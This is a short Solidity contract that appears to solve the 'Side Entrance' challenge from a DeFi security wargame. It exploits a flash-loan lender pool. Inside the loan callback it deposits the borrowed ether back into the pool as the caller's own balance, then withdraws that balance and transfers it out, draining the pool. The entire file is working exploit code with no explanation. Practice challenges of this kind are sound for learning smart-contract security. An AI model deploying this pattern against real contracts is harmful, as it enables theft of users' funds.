pragma solidity ^0.6.0;

import "./SideEntranceLenderPool.sol";

contract HackSideEntranceLenderPool is IFlashLoanEtherReceiver {

	SideEntranceLenderPool private pool;

    constructor(address poolAddress) public {
        pool = SideEntranceLenderPool(poolAddress);
    }

    function execute() external payable override {
    	pool.deposit{value: msg.value}();
    }

    function makeFlashLoan(uint256 amount) public {
    	pool.flashLoan(amount);
    	pool.withdraw();
    	msg.sender.transfer(amount);
    }

    receive() external payable {}
}
